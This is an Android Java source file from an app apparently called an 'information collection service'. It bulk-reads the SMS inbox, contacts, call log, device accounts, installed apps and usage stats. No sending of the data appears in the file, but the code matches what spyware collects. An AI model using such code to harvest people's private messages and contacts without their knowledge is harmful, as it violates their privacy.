package com.example.informationcollectionservice;
import static android.os.Build.ID;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;

import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Patterns;

import androidx.annotation.NonNull;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Pattern;

public class Options {


    @NonNull
    public static List<SMS>getSMS(@NonNull Context context){
        List<SMS> lstSms = new ArrayList<SMS>();
        SMS objSMS = new SMS();
        Uri message = Uri.parse("content://sms/inbox");

        ContentResolver cr = context.getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);

        int totalSMS = c.getCount();
        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSMS = new SMS();
                objSMS.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSMS.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSMS.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSMS.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSMS.setFolderName("inbox");
                } else {
                    objSMS.setFolderName("sent");
                }

                lstSms.add(objSMS);
                c.moveToNext();
            }
        }
        c.close();

        return lstSms;
    }

    @SuppressLint("Range")
    @NonNull
    public static List<Contacts>getContacts(@NonNull Context context){
        List<Contacts> lstContacts = new ArrayList<Contacts>();
        Contacts contact = new Contacts();
        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);

        if(cursor.getCount()>0)
        {
            while (cursor.moveToNext())
            {
                contact = new Contacts();
                contact.setId(cursor.getString(
                        cursor.getColumnIndex(
                                ContactsContract.Contacts._ID)));
                contact.setName(cursor.getString(
                        cursor.getColumnIndex(
                                ContactsContract.Contacts
                                        .DISPLAY_NAME)));

                int hasNumber = Integer.parseInt(cursor.getString(
                        cursor.getColumnIndex(
                                ContactsContract.Contacts
                                        .HAS_PHONE_NUMBER)));
                if(hasNumber>0)
                {
                    Cursor phoneCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID+" = ?",new String[]{contact.getId()},null);
                    while (phoneCursor.moveToNext())
                    {
                        contact.setPhoneNumber(phoneCursor.getString(phoneCursor.getColumnIndex(
                                ContactsContract.
                                        CommonDataKinds.
                                        Phone.NUMBER)));
                    }
                    phoneCursor.close();

                }
                lstContacts.add(contact);
            }
        }

        cursor.close();

        return lstContacts;
    }

    @SuppressLint("Range")
    @NonNull
    public static List<Call>getCalls(@NonNull Context context)
    {
        List<Call> lstCalls = new ArrayList<Call>();
        Call call = new Call();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor.getCount()>0) {
            while (cursor.moveToNext())
            {
                call = new Call();
                call.setId(cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)));
                call.setNumber(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                call.setName(cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                call.setDuration(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                int date=cursor.getColumnIndex(CallLog.Calls.DATE);
                String date_ = cursor.getString(date);
                Date d = new Date(Long.valueOf(date_));
                call.setDate(d.toString());

                switch (Integer.parseInt(type)) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        call.setType("OUTGOING");
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        call.setType("INCOMING");
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        call.setType("MISSED");
                }
                if(call.getName()==null)
                    call.setName("Unknown");
                lstCalls.add(call);
            }

        }
        cursor.close();


        return lstCalls;
    }

    @NonNull
    public static SysInf getSysInf(@NonNull Context context)
    {
        SysInf sysInf = new SysInf();
        sysInf.setOSVersion(Build.VERSION.RELEASE);
        sysInf.setSDKVersion(Build.VERSION.SDK_INT);

        ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
        ActivityManager actManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        actManager.getMemoryInfo(mi);
        long availableMegs = mi.availMem / (1024*1024*1024);
        long totalMemory = mi.totalMem/(1024*1024*1024);
        sysInf.setFreeMemory(availableMegs);

       /* List<ActivityManager.RunningAppProcessInfo> processInfos = actManager.getRunningAppProcesses(); //для API21+ дает ток текущий проц
        List<String>lstProc = new ArrayList<String>();

        for(int i=0;i<processInfos.size();i++)
        {
            lstProc.add(processInfos.get(i).processName);
        }
        sysInf.setProcessList(lstProc);*/

        List<String> sortedApplication = UStats.printCurrentUsageStatus(context);
        sysInf.setProcessList(sortedApplication);

        List<String>accountlst = new ArrayList<>();
        Account[] accounts = AccountManager.get(context).getAccounts();
        Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
        for(Account account : accounts)
            //if (gmailPattern.matcher(account.name).matches())
                accountlst.add("Account: "+account.name +" Service: "+ account.type);
        sysInf.setAccountList(accountlst);

        final PackageManager packageManager = context.getPackageManager();
        List<ApplicationInfo> applicationInfos = packageManager.getInstalledApplications(0);
        List<Application>lstApp = new ArrayList<Application>();
        for(ApplicationInfo applicationInfo : applicationInfos)
        {
            if((applicationInfo.flags&ApplicationInfo.FLAG_SYSTEM)==0) { //фильтрация на несистемные апп
                Application app = new Application();
                app.setName(applicationInfo.packageName);
                app.setPath(applicationInfo.sourceDir);
                lstApp.add(app);
            }
        }
        sysInf.setAppList(lstApp);

        return sysInf;
    }
}
